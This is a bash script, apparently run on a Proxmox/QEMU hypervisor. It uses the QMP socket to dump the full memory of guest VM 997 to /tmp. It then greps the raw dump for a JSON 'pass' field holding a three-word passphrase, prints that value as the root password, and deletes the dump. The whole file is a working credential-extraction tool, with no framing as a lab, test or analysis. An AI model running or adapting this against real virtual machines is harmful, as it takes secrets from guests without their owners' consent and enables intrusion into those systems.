#!/bin/bash

VMID=997
DUMP=/tmp/vm${VMID}.mem
MAX_WAIT=60            # seconds to wait for the dump to finish
SOCK=/var/run/qemu-server/${VMID}.qmp

echo "## Arguments validation:"
echo ""
echo "- VMID: $VMID"
echo "- DUMP: $DUMP"
echo "- MAX_WAIT: $MAX_WAIT"
echo ""

echo "# 1  qmp_capabilities + dump-guest-memory"
{
  echo '{"execute":"qmp_capabilities"}'
  sleep 1                                   # keep: avoids the handshake race
  echo '{"execute":"dump-guest-memory",'\
'"arguments":{"protocol":"file:'${DUMP//\//\\/}'",'\
'"paging":false,"detach":false}}'
} | socat - UNIX-CONNECT:"$SOCK" >/dev/null

echo -n "# 2  waiting for dump "
prev=0
for ((i=0; i<MAX_WAIT*2; i++)); do          # 0.5-s steps → MAX_WAIT seconds
  size=$(stat -c%s "$DUMP" 2>/dev/null || echo 0)
  printf "\r# 2  waiting for dump %s bytes" "$size"
  if [ "$size" -ne 0 ] && [ "$size" -eq "$prev" ]; then
    echo                                     # newline after final size
    break
  fi
  prev=$size
  sleep 0.5
done

echo "# 3  extract password"
start=$(date +%s%3N)                        # milliseconds since epoch
pw=$(strings -n 3 "$DUMP" |
     grep -Eo '"pass"[[:space:]]*:[[:space:]]*"[a-z]+-[a-z]+-[a-z]+"' |
     head -n1 | cut -d'"' -f4)
end=$(date +%s%3N)
printf "# 3  done in %.3f s\n" "$(bc <<< "scale=3; ($end-$start)/1000")"

echo "root password: $pw"
rm -f "$DUMP"
